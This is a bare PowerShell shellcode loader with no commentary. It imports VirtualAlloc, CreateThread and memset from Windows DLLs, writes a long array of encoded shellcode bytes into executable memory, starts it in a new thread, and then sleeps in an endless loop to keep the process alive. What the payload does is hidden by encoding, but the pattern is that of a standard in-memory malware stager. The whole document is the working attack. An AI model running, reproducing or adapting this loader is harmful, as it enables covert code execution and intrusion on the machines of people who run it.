$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc9,0xd9,0x74,0x24,0xf4,0xbd,0xa2,0xc1,0xd0,0x61,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x14,0x03,0x6a,0xb6,0x23,0x25,0x9d,0x5e,0x21,0xc6,0x5e,0x9e,0x46,0x4e,0xbb,0xaf,0x46,0x34,0xcf,0x9f,0x76,0x3e,0x9d,0x13,0xfc,0x12,0x36,0xa0,0x70,0xbb,0x39,0x01,0x3e,0x9d,0x74,0x92,0x13,0xdd,0x17,0x10,0x6e,0x32,0xf8,0x29,0xa1,0x47,0xf9,0x6e,0xdc,0xaa,0xab,0x27,0xaa,0x19,0x5c,0x4c,0xe6,0xa1,0xd7,0x1e,0xe6,0xa1,0x04,0xd6,0x09,0x83,0x9a,0x6d,0x50,0x03,0x1c,0xa2,0xe8,0x0a,0x06,0xa7,0xd5,0xc5,0xbd,0x13,0xa1,0xd7,0x17,0x6a,0x4a,0x7b,0x56,0x43,0xb9,0x85,0x9e,0x63,0x22,0xf0,0xd6,0x90,0xdf,0x03,0x2d,0xeb,0x3b,0x81,0xb6,0x4b,0xcf,0x31,0x13,0x6a,0x1c,0xa7,0xd0,0x60,0xe9,0xa3,0xbf,0x64,0xec,0x60,0xb4,0x90,0x65,0x87,0x1b,0x11,0x3d,0xac,0xbf,0x7a,0xe5,0xcd,0xe6,0x26,0x48,0xf1,0xf9,0x89,0x35,0x57,0x71,0x27,0x21,0xea,0xd8,0x2f,0x86,0xc7,0xe2,0xaf,0x80,0x50,0x90,0x9d,0x0f,0xcb,0x3e,0xad,0xd8,0xd5,0xb9,0xd2,0xf2,0xa2,0x56,0x2d,0xfd,0xd2,0x7f,0xe9,0xa9,0x82,0x17,0xd8,0xd1,0x48,0xe8,0xe5,0x07,0xe4,0xed,0x71,0x1a,0xc7,0xb5,0x12,0x32,0x3a,0x46,0x36,0x7b,0xb3,0xa0,0x66,0x2b,0x94,0x7c,0xc6,0x9b,0x54,0x2d,0xae,0xf1,0x5a,0x12,0xce,0xf9,0xb0,0x3b,0x64,0x16,0x6d,0x13,0x10,0x8f,0x34,0xef,0x81,0x50,0xe3,0x95,0x81,0xdb,0x00,0x69,0x4f,0x2c,0x6c,0x79,0x27,0xdc,0x3b,0x23,0xe1,0xe3,0x91,0x4e,0x0d,0x76,0x1e,0xd9,0x5a,0xee,0x1c,0x3c,0xac,0xb1,0xdf,0x6b,0xa7,0x78,0x4a,0xd4,0xdf,0x84,0x9a,0xd4,0x1f,0xd3,0xf0,0xd4,0x77,0x83,0xa0,0x86,0x62,0xcc,0x7c,0xbb,0x3f,0x59,0x7f,0xea,0xec,0xca,0x17,0x10,0xcb,0x3d,0xb8,0xeb,0x3e,0xbc,0x84,0x3d,0x06,0xca,0xe4,0xfd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
